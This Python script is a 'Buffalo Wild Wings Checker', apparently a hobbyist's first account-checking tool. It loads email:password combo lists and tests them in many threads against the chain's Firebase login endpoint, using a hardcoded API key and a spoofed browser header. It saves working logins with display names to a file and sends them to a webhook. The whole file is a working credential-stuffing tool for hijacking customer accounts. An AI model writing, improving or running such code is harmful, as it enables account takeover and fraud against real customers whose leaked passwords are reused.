"""

Buffalo Wild Wings Checker

yea ik the code looks ugly i will try to make the next checkers less ugly
this is the first checker i made btw for this 

"""

import requests, os, time, queue, threading, json
from colorama import Fore

from Modules.functions import Functions, Data

# ----------------------------------------- #

cyan = Fore.CYAN
red = Fore.RED
green = Fore.GREEN
yellow = Fore.YELLOW

# ----------------------------------------- #

data = Data(0, 0, 0, 0, 0, 0)
func = Functions()

class Checker:
    def __init__(self, threads: int, accounts: list):
        self.threads = threads
        self.accounts = accounts

    def cls(self):
        os.system('cls')

    def load_accounts(self):
        with open('combo.txt', 'r', encoding='utf-8') as f:
            accounts = f.readlines()
        for i in accounts:
            self.accounts.append(i)

        return len(accounts)
    
    # ------------------------------------------- #

    def main(self):
        q = queue.Queue()
        for i in self.accounts:
            p = i.strip()
            acc = p.split(":")
            q.put(acc)

        def login(q):
            while not q.empty():
                try:
                    combo = q.get()
                    username, password = combo
                    acc = f"{username}:{password}"

                    u = "https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key=AIzaSyCmtykcZ6UTfD0vvJ05IpUVe94uIaUQdZ4"
                    j = {"email":f"{username}","password":f"{password}","returnSecureToken":'true'}
                    h = {
                        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.115 Safari/537.36 OPR/88.0.4412.85',
                        'x-client-version': 'Opera/JsCore/8.3.0/FirebaseCore-web'
                    }

                    try:
                        r = requests.post(u, json=j, headers=h)

                        if r.status_code == 400:
                            print(red + f"[{func.timestamp()}] | [-] {acc}")
                            data.bad += 1
                        else:
                            try:
                                rj = r.json()
                                display = rj['displayName']
                    
                                account = f"[{func.timestamp()}] | [+] {acc} | Display Name --> {display}"
                                acc = f"{acc} | Display Name --> {display}"
                                print(green + f"{account}")

                                if func.hook()[0]:
                                    hook = func.hook()[1]
                                    func.send_hit(hook, account)
                                
                                func.writeh("bww", acc)
                                data.hits += 1
                            except:
                                print(red + f"[{func.timestamp()}] | [-] {acc}")
                                data.bad += 1
                                
                    except:
                        data.retries += 1
                        print(yellow + f"[{func.timestamp()}] | [!] {acc}")
                except:
                    data.retries += 1
                    print(yellow + "[!] Invalid Format")

        threads = []
        for i in range(self.threads):
            t = threading.Thread(target=login, args=(q,))
            threads.append(t)
            t.start()
        for t in threads:
            t.join()

# ----------------------------------------- #

def bww():
    checker = Checker(0, [])
    checker.cls()

    # ------------------------------------------- #

    try:
        threads = int(input(cyan + "Threads: "))
        checker.threads = threads
        checker.cls()
    except:
        print(red + "[!] Error")
        time.sleep(1.5)
        bww()

    # ------------------------------------------- #

    accounts = checker.load_accounts()
    input(cyan + f"Accounts: {accounts} | Threads: {checker.threads} | Press Enter To Start > ")
    print()

    # ------------------------------------------- #

    checker.main()
    func.notify(func.get_hook(), data.hits)
    input(f"\n{green}- Hits: {data.hits}\n{red}- Bad: {data.bad}\n{yellow}- Retries: {data.retries}\n\n{cyan}Press Enter To Continue > ")